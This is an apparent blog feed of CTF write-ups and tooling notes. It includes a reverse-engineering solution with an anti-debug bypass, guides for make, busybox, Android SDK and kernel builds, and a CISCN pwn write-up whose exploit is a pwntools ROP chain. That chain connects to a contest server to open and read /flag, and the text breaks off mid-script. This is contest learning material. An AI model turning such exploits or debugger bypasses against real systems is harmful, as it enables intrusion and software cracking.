</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span>[] x = &#123;<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">16</span>, <span class="number">253</span>, <span class="number">201</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">205</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span>[] y = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="number">150</span>, <span class="number">174</span>, <span class="string">&#x27;D&#x27;</span>, <span class="number">180</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="number">214</span>, <span class="number">189</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="number">189</span>, <span class="number">217</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="number">19</span>, <span class="number">138</span>, <span class="number">199</span>, <span class="number">128</span>, <span class="string">&#x27;@&#x27;</span>, <span class="number">220</span>, <span class="number">222</span>, <span class="number">234</span>, <span class="number">11</span>, <span class="number">175</span>, <span class="number">228</span>, <span class="number">129</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得flag: <code>PCTF&#123;1ts_not_5c2ipt_Chall3nge&#125;</code></p><p>本题参考:</p><ol><li><p><a href="https://blog.csdn.net/qq_33438733/article/details/79995702">171130 逆向-JarvisOJ（Fibonacci）</a></p></li><li><p><a href="http://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html">Unpacking Jar2Exe 2.1: Extracting The Jar File At All 3 Protection Levels</a></p></li></ol><h2 id="软件密码破解-1"><a href="#软件密码破解-1" class="headerlink" title="软件密码破解-1"></a>软件密码破解-1</h2><p>程序打开来7千多个函数，找不到入口，大致看了一下，发现有个地方很可疑, 这里由于动态调试过，因此基址会有出入（起始地址0x00B01000）</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021191849.png" alt="20201021191849"></p><p>按<code>Alt + A</code> 修改为 <code>Unicode C-style(16 bits)</code> 得到中文 <code>你赢了</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021191959.png" alt="20201021191959"></p><p>找到函数<code>0x00B01BB0</code>, 猜测校验及加密如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20201021192141.png" alt="20201021192141"></p><p>其中byte_C777F8是生成出来的，可用动态调试得到，但是本题用了反调试，这里直接暴力绕过，即<code>jz =&gt; jmp</code>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:00B01BE8                 jmp     short loc_B01BF2 ; Keypatch modified this from:</span><br><span class="line">.text:00B01BE8                                         ;   jz short loc_E21BF2</span><br><span class="line">.text:00B01BEA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00B01BEA                 push    0               ; uExitCode</span><br><span class="line">.text:00B01BEC                 call    ds:ExitProcess</span><br><span class="line">.text:00B01BF2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00B01BF2</span><br><span class="line">.text:00B01BF2 loc_B01BF2:                             ; CODE XREF: sub_B01BB0+38↑j</span><br></pre></td></tr></table></figure><p>则在调试过程中可得byte_C777F8，最终解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x28</span>, <span class="number">0x57</span>, <span class="number">0x64</span>, <span class="number">0x6B</span>, <span class="number">0x93</span>, <span class="number">0x8F</span>, <span class="number">0x65</span>, <span class="number">0x51</span>, <span class="number">0xE3</span>, <span class="number">0x53</span>,</span><br><span class="line">     <span class="number">0xE4</span>, <span class="number">0x4E</span>, <span class="number">0x1A</span>, <span class="number">0xFF</span>]</span><br><span class="line">check_num = [<span class="number">0x1B</span>, <span class="number">0x1C</span>, <span class="number">0x17</span>, <span class="number">0x46</span>, <span class="number">0xF4</span>,</span><br><span class="line">             <span class="number">0xFD</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0xB7</span>, <span class="number">0x0C</span>, <span class="number">0x8E</span>, <span class="number">0x7E</span>, <span class="number">0x78</span>, <span class="number">0xDE</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([s[i] ^ check_num[i]])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag：<code>3Ks-grEaT_j0b!</code></p>]]></content>
    
    
    <summary type="html">Jarvis OJ 题库练习</summary>
    
    
    
    <category term="CTF" scheme="http://lantern.cool/categories/CTF/"/>
    
    
    <category term="Write up" scheme="http://lantern.cool/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>make 工具降版本</title>
    <link href="http://lantern.cool/note-pwn-kernel-low-version-make/"/>
    <id>http://lantern.cool/note-pwn-kernel-low-version-make/</id>
    <published>2020-08-26T15:10:19.000Z</published>
    <updated>2020-08-26T15:10:16.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>使用替换后make编译内核3.18.4时出现<code>segmentation fault</code>错误导致无法使用, 方案放弃</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为要编译低版本的内核, 但是高版本make在编译时会因为编译规则问题而报错，因此要考虑降低 make 版本</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><ol><li><p>下载 make 3.81</p><p> 在官网 <a href="https://ftp.gnu.org/gnu/make/">https://ftp.gnu.org/gnu/make/</a> 下载对应版本的 make, 如:</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/make/make-3.81.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>解压</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar xf make-3.81.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>执行 configuration</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/make-3.81</span><br></pre></td></tr></table></figure></li><li><p>执行build.sh</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh build.sh</span><br></pre></td></tr></table></figure></li><li><p>安装 make</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure></li><li><p>替换 make</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp make /usr/bin/make</span><br></pre></td></tr></table></figure></li><li><p>可以看到版本已经降下来了</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  make-3.81 make --version</span><br><span class="line">GNU Make 3.81</span><br><span class="line">Copyright (C) 2006  Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.</span><br><span class="line">There is NO warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line"></span><br><span class="line">This program built <span class="keyword">for</span> x86_64-unknown-linux-gnu</span><br></pre></td></tr></table></figure></li></ol><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li><p>在执行<code>sh build.sh</code>时, 遇到如下错误</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob.o: In function `glob_in_dir&#x27;:</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:1336: undefined reference to `__alloca&#x27;</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:1250: undefined reference to `__alloca&#x27;</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:1277: undefined reference to `__alloca&#x27;</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:1361: undefined reference to `__alloca&#x27;</span><br><span class="line">glob.o: In function `glob&#x27;:</span><br><span class="line">/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:575: undefined reference to `__alloca&#x27;</span><br><span class="line">glob.o:/mnt/d/Users/Lantern/Desktop/work/kernal/make-3.81/./glob/glob.c:726: more undefined references to `__alloca&#x27; follow</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure><p> 在 <a href="https://stackoverflow.com/questions/51675200/install-older-version-of-gnu-make-in-ubuntu-18-04">https://stackoverflow.com/questions/51675200/install-older-version-of-gnu-make-in-ubuntu-18-04</a> 找到解决方法:</p><p> 将<code>glob.c</code>中的</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">if</span> _GNU_GLOB_INTERFACE_VERSION == GLOB_INTERFACE_VERSION</span></span><br></pre></td></tr></table></figure><p> 改为</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">if</span> _GNU_GLOB_INTERFACE_VERSION &gt;= GLOB_INTERFACE_VERSION</span></span><br></pre></td></tr></table></figure><p> 即可成功编译</p></li></ol>]]></content>
    
    
    <summary type="html">make 工具降版本</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Pwn" scheme="http://lantern.cool/categories/Note/Pwn/"/>
    
    
    <category term="Kernel" scheme="http://lantern.cool/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>在Android上安装busybox</title>
    <link href="http://lantern.cool/note-andorid-install-busybox/"/>
    <id>http://lantern.cool/note-andorid-install-busybox/</id>
    <published>2020-08-26T09:22:26.000Z</published>
    <updated>2020-08-26T09:22:29.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>前提：手机已经root</p></blockquote><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>打开<a href="http://www.busybox.net/downloads/binaries">官网</a>，选择最新版本，然后下载对应设备的架构版本，我这里下载了<code>busybox-armv8l</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/12.png" alt="12"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>然后修改文件名字为<code>busybox</code>并上传到手机上</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push busybox /data/<span class="built_in">local</span>/tmp/</span><br></pre></td></tr></table></figure><p>切换为<code>root</code>权限并修改<code>busybox</code>执行权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su</span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp/</span><br><span class="line">chmod +x busybox</span><br></pre></td></tr></table></figure><p>移动至<code>/system/xbin</code>目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv ./busy /system/xbin</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./busybox --install /system/xbin</span><br></pre></td></tr></table></figure><p>就可以使用命令了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vince:/data/<span class="built_in">local</span>/tmp $ find -name busybox</span><br><span class="line">./busybox</span><br></pre></td></tr></table></figure><h2 id="对比ls指令"><a href="#对比ls指令" class="headerlink" title="对比ls指令"></a>对比ls指令</h2><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/13.png" alt="13.png"></p><p>高下立判</p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ul><li><p><code>android</code>系统本身就有<code>ls</code>命令，<code>busybox</code>里也有<code>ls</code>，输入ls时调用的是<code>android</code>的<code>ls</code>，那么想用<code>busybox</code>的<code>ls</code>就要每次都在前面加个<code>busybox</code>吗？不用，使用<code>alias</code>命令可以搞定。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ls=<span class="string">&#x27;busybox ls&#x27;</span></span><br></pre></td></tr></table></figure><p>同样的，<code>cp</code>、<code>mv</code>等二者都有的命令都可以这样搞定。也可以通过修改 <code>/init.rc</code>来解决。</p></li></ul>]]></content>
    
    
    <summary type="html">在Android上安装busybox</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Android" scheme="http://lantern.cool/categories/Note/Android/"/>
    
    
    <category term="Android" scheme="http://lantern.cool/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android SDK Tools Install</title>
    <link href="http://lantern.cool/note-andorid-sdk-tool/"/>
    <id>http://lantern.cool/note-andorid-sdk-tool/</id>
    <published>2020-08-26T09:22:26.000Z</published>
    <updated>2020-08-26T09:22:29.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考：<a href="https://www.cnblogs.com/nebie/p/9145627.html">Android SDK的下载和安装</a></p><h2 id="完整下载"><a href="#完整下载" class="headerlink" title="完整下载"></a>完整下载</h2><p>目前官网上已经没有单独的SDK下载安装包了。目前<a href="https://developer.android.com/studio/">官网</a>推荐的是下载包含有Android SDK的Android Studio， 当然我们也可以使用jetbrain的<a href="https://www.jetbrains.com/toolbox-app/">Tool Box</a>下载</p><p>如果你发现下载完整版以后没有<code>SDK Tools</code>可选，参考官网，<a href="https://developer.android.com/studio/releases/sdk-tools">https://developer.android.com/studio/releases/sdk-tools</a>，官方已停止更新</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/9.png" alt="9.png"></p><p>然而在command-line tools我也没有找到<code>uiautomatorviewer.bat</code></p><h2 id="单独下载"><a href="#单独下载" class="headerlink" title="单独下载"></a>单独下载</h2><p>如果你实在想单独下载<code>SDK Tools</code>和<code>Platfrom Tools</code>的话，可以直接在<a href="https://developer.android.com/studio/releases">官网</a>和<a href="https://www.androiddevtools.cn/">国内Android工具的下载网站</a>下载</p><h3 id="国内下载站"><a href="#国内下载站" class="headerlink" title="国内下载站"></a>国内下载站</h3><p>进入页面后点击【Android SDK 工具】按钮，然后在弹出的选择框内点击【SDK Tools】按钮，然后界面会自动跳转到SDK 的下载界面，选择适合自己的版本进行下载</p><p>而【SDK Platform-Tools】就在【SDK Tools】的下一块</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/2.png" alt="2"></p><h3 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h3><h4 id="platform-tools"><a href="#platform-tools" class="headerlink" title="platform tools"></a>platform tools</h4><p><a href="https://developer.android.com/studio/releases/platform-tools">https://developer.android.com/studio/releases/platform-tools</a></p><p>如果你使用的是中文文档，请转换为英文，否则你点击下载链接将无事发生（2020.4.28）</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/sdk-tool-platform.png" alt="sdk-tool-platform"></p><p>暂时找不到官方SDK Tools怎么下载….</p>]]></content>
    
    
    <summary type="html">Android SDK Tools Install</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Android" scheme="http://lantern.cool/categories/Note/Android/"/>
    
    
    <category term="Android" scheme="http://lantern.cool/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>UI Automator Viewer的使用</title>
    <link href="http://lantern.cool/note-andorid-ui-automator-viewer/"/>
    <id>http://lantern.cool/note-andorid-ui-automator-viewer/</id>
    <published>2020-08-26T09:22:26.000Z</published>
    <updated>2020-08-26T09:22:29.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h2><p><strong>uiautomatorviewer</strong>是 android SDK 自带的工具。通过截屏并分析 XML 布局文件的方式，为用户提供控件信息查看服务。该工具位于 SDK 目录下的 <code>tools\bin</code> 子目录下，通过bat文件启动的。</p><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p>整个界面分四个区域</p><ul><li><p>工作栏区（上）</p><p>共四个按钮，从左至右分别用于：打开已保存的布局，获取详细布局，获取简洁布局，保存布局。</p><ul><li>保存布局<code>Save</code>：将存储两个文件，一个是图片文件，一个是.uix文件（XML布局结构）</li><li>获取详细布局<code>Device Screenshoot (uiautomator dump)</code>: 将全部布局呈现出来</li><li>获取简洁布局<code>Device Screenshoot with Compressed Hierarchy (uiautomator dump –compressed)</code>: 只呈现有用的控件布局</li></ul></li><li><p>截图区（左），显示当前屏幕显示的布局图片</p></li><li><p>布局区（右上）,已XML树的形式，显示控件布局</p></li><li><p>控件属性区（右下），当点击某一控件时，将显示控件属性</p></li></ul><h2 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h2><p>第一次点击Device Screenshoot按钮时，将会报错，显示如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/3.png" alt="3.png"></p><p>原因是在于，<code>uiautomatorviewer.bat</code>中，需要知道 SDK 下的子目录 <code>platform-tools</code> 的路径，即 bat 文件中的<code>%prog_dir%</code>，因此我们需要修改 <code>uiautomatorviewer.bat</code> 中最后一行代码，将<code>%prog_dir%</code>替换为 <code>platform-tools</code> 的实际目录。</p><p>修改前:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">call <span class="string">&quot;%java_exe%&quot;</span> <span class="string">&quot;-Djava.ext.dirs=%javaextdirs%&quot;</span> <span class="string">&quot;-Dcom.android.uiautomator.bindir=%prog_dir%&quot;</span> -jar %jarpath% %*</span><br></pre></td></tr></table></figure><p>修改后:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">call <span class="string">&quot;%java_exe%&quot;</span> <span class="string">&quot;-Djava.ext.dirs=%javaextdirs%&quot;</span> <span class="string">&quot;-Dcom.android.uiautomator.bindir=C:\Users\XXXXX\AppData\Local\Android\Sdk\platform-tools&quot;</span> -jar %jarpath% %*</span><br></pre></td></tr></table></figure><p><code>p.s. XXXXX为用户名</code></p><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p>再次点击，出现如下错误</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/4.png" alt="4.png"></p><p>折腾了好久，最终在<a href="https://github.com/yaming116/uiautomatorview">https://github.com/yaming116/uiautomatorview</a>找到解决方法</p><p>我们直接下载<code>LvmamaXmlKit.jar</code>和<code>uiautomatorviewer.jar</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/5.png" alt="5.png"></p><p>将<code>uiautomatorviewer.jar</code>替换<code>\tools\lib\uiautomatorviewer.jar</code></p><p>如果带后缀如<code>xxx-25.3.1.jar</code>也要重命名带上后缀</p><p>由于 adb 截图使用的是<a href="https://testerhome.com/topics/12459">LvmamaXmlKit</a>,所以使用此功能需要把这个 LvmamaXmlKit.jar 导入到手机中，否则将报错，命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push LvmamaXmlKit.jar /data/<span class="built_in">local</span>/tmp</span><br></pre></td></tr></table></figure><h2 id="成功捕获"><a href="#成功捕获" class="headerlink" title="成功捕获"></a>成功捕获</h2><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/6.png" alt="6.png"></p>]]></content>
    
    
    <summary type="html">UI Automator Viewer的使用</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Android" scheme="http://lantern.cool/categories/Note/Android/"/>
    
    
    <category term="Android" scheme="http://lantern.cool/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Linux 编译内核问题汇总</title>
    <link href="http://lantern.cool/note-pwn-kernel-compilation-problem/"/>
    <id>http://lantern.cool/note-pwn-kernel-compilation-problem/</id>
    <published>2020-08-25T20:19:33.000Z</published>
    <updated>2020-08-25T20:19:36.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内核编译时总会遇到一些奇奇怪怪的问题, 这里是对这些问题的解决的汇总</p><h2 id="gcc-版本问题"><a href="#gcc-版本问题" class="headerlink" title="gcc 版本问题"></a>gcc 版本问题</h2><p>高版本gcc编译低版本总会有一堆error, 可采用多版本gcc共存的方案, 详见<a href="https://lantern.cool/tool-linux-muti-gcc/">Linux环境多版本编译器(gcc)共存</a>, 再用低版本gcc进行编译即可</p><p>也可以用于解决编译时错误<code>fatal error: linux/compiler-gcc7.h: No such file or directory</code></p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ol><li><p>编译遇到错误<code>.size expression for copy_user_generic_c does not evaluate to a constant</code>, 可修改<code>arch/x86_64/lib/copy_user.S</code>中的<code>END(copy_user_generic_c)</code> 更改为 <code>END(copy_user_generic_string)</code>, 目的是与上边的 <code>ENTRY(（)copy_user_generic_string)</code>保持相同变量, 解决方案来自<a href="https://stackoverflow.com/questions/23194840/linux-2-6-24-kernel-compilation-error-size-expression-for-copy-user-generic-c-d">https://stackoverflow.com/questions/23194840/linux-2-6-24-kernel-compilation-error-size-expression-for-copy-user-generic-c-d</a></p></li><li><p>编译遇到如下问题</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error:Makefile:416: *** mixed implicit and normal rules. stop</span><br><span class="line">error:Makefile:1449: *** mixed implicit and normal rules. stop</span><br></pre></td></tr></table></figure><p> 原因及解决方法：make版本过高, 需要修改错误信息中的Makefile指定416、1449行内容</p><ul><li>416：<code>config %config: scripts_basic outputmakefile FORCE</code> 改为：<code>%config: scripts_basic outputmakefile FORCE</code></li><li>1449：<code>/ %/: prepare scripts FORCE</code> 改为：<code>%/: prepare scripts FORCE​​​​​​​</code></li></ul></li><li><p>编译遇到如下错误</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kernel/built-in.o: In function `mutex_lock&#x27;:</span><br><span class="line"> (.sched.text+0x11cf): undefined reference to `__mutex_lock_slowpath&#x27;</span><br><span class="line"> kernel/built-in.o: In function `mutex_unlock&#x27;:</span><br><span class="line"> (.sched.text+0x11de): undefined reference to `__mutex_unlock_slowpath&#x27;</span><br><span class="line"> Makefile:715: recipe for target &#x27;.tmp_vmlinux1&#x27; failed</span><br><span class="line"> make: *** [.tmp_vmlinux1] Error 1</span><br></pre></td></tr></table></figure><p>解决方案: 在<code>kernel/mutex.c</code>文件中对四个位置进行修改,<br>将三处<code>static void fastcall noinline __sched</code>修改为<code>static __attribute__ ((used)) void fastcall noinline __sched</code></p><p>将<code>static fastcall noinline void</code>改为<code>static __attribute__ ((used)) void fastcall noinline __sched</code></p></li><li><p>如果出现以下信息导致编译错误，可能是由于 make 版本过高的缘故，如果你是用 Ubuntu18 进行编译，不妨试试 Ubuntu16 或降低 make 版本, <a href="https://lantern.cool/note-pwn-kernel-low-version-make">make 工具降版本</a></p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make[2]: *** No rule to make target <span class="string">&#x27;net/netfilter/xt_TCPMSS.o&#x27;</span>, needed by <span class="string">&#x27;net/netfilter/built-in.o&#x27;</span>.  Stop.</span><br><span class="line">scripts/Makefile.build:573: recipe <span class="keyword">for</span> target <span class="string">&#x27;net/netfilter&#x27;</span> failed</span><br><span class="line">make[1]: *** [net/netfilter] Error 2</span><br><span class="line">make[1]: *** Waiting <span class="keyword">for</span> unfinished <span class="built_in">jobs</span>....</span><br></pre></td></tr></table></figure></li><li><p>如果出现以下信息到启动错误，是因为 <code>vmlinux</code> 是 ELF 文件格式，这时用 <code>bzImage</code> 启动虚拟机就可以了</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu: linux kernel too old to load a ram disk</span><br></pre></td></tr></table></figure></li><li><p>如果编译内核时出现 <code>cc1: error: code model kernel does not support PIC mode</code> 错误</p><p> 查找 <code>Makefile</code> 文件中的 <code>KBUILD_CFLAGS</code>, 在尾部添加 <code>-fno-pie</code> 即可，以 linux-4.7 版本源码 Makefile 为例，如图</p><p> <img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200821185911.png" alt="20200821185911"></p></li><li><p>如果编译内核时出现错误<code>make[2]: *** No rule to make target &#39;net/netfilter/xt_TCPMSS.o&#39;, needed by &#39;net/netfilter/built-in.o&#39;.  Stop</code>, 原因可能是你所用的文件系统不区分大小写, 在 <code>net/netfilter</code> 文件夹下应该有两个文件<code>xt_TCPMSS.c</code> 与 <code>xt_tcpmss.c</code>, 但你会发现实际上只有<code>xt_tcpmss.c</code>, 就是不区分大小写所致</p></li></ol>]]></content>
    
    
    <summary type="html">汇总一些自己遇到的问题</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Pwn" scheme="http://lantern.cool/categories/Note/Pwn/"/>
    
    
    <category term="Kernel" scheme="http://lantern.cool/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 初赛</title>
    <link href="http://lantern.cool/wp-games-2020ciscn-pre/"/>
    <id>http://lantern.cool/wp-games-2020ciscn-pre/</id>
    <published>2020-08-24T20:22:34.000Z</published>
    <updated>2020-08-24T20:22:31.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>菜鸡又是只会签到, pwn基本都是nuoye大哥做的, 这是他的blog: <a href="https://nuoye-blog.github.io/2020/08/21/37439286/">2020CISCN-线上初赛</a></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="wow"><a href="#wow" class="headerlink" title="wow"></a>wow</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>与2020 RCTF的bf类似，缓冲区紧接着的指令指针存在off by one，可以控制该指针在栈上任意输入。</p><p>劫持返回地址构造rop，并将指令指针还原回去（存在check）。</p><p>因为禁用了execute系统调用，所以需要通过ORW方式获取flag。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./wow&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;101.200.53.148&quot;</span>,<span class="string">&quot;15324&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004047ba</span></span><br><span class="line">pop_rsi=<span class="number">0x0000000000407578</span></span><br><span class="line">pop_rdx=<span class="number">0x000000000040437f</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000404c41</span></span><br><span class="line">pop_rax_rdx_rbx=<span class="number">0x000000000053048a</span></span><br><span class="line">mov_rdi_rax = <span class="number">0x000000000041768f</span></span><br><span class="line">syscall = <span class="number">0x00000000004dc054</span></span><br><span class="line">read = <span class="number">0x52A670</span></span><br><span class="line">bss = <span class="number">0x5d3520</span></span><br><span class="line">puts = <span class="number">0x4D47B4</span></span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += <span class="string">&#x27;/flag&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span></span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(mov_rdi_rax)</span><br><span class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += p64(<span class="number">0x2</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(syscall)<span class="comment">#open</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(bss+<span class="number">0x100</span>)</span><br><span 